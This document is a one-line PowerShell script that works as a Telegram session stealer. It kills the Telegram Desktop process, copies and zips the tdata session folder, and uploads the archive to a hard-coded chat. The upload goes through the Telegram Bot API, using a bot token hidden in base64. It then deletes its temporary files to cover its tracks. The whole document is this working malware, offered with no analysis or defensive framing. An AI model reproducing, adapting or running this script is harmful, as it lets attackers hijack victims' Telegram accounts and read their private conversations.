$src=Join-Path $env:APPDATA "Telegram Desktop\tdata";$temp=Join-Path $env:TEMP "tdata_temp_$(Get-Date -Format 'yyyyMMddHHmmss')";$zip=Join-Path $env:TEMP "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip";$tent="Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo=";$tentet=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tent));$cht="5047177665";if(!(Test-Path $src -PathType Container)-or!(Test-Path $env:TEMP -PathType Container)){exit 1}try{if(Get-Process Telegram -ErrorAction SilentlyContinue){Stop-Process -Name Telegram -Force;Start-Sleep -Milliseconds 500}New-Item $temp -ItemType Directory -Force|Out-Null;Copy-Item "$src\*" $temp -Recurse -Force;Compress-Archive "$temp\*" $zip -Force;if(!(Test-Path $zip -PathType Leaf)){exit 1}$uri="https://api.telegram.org/bot$tentet/sendDocument";$form=@{chat_id=$cht;document=Get-Item $zip};Invoke-RestMethod -Uri $uri -Method Post -Form $form}catch{exit 1}finally{if(Test-Path $temp){Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue}if(Test-Path $zip){Remove-Item $zip -Force -ErrorAction SilentlyContinue}}exit 0
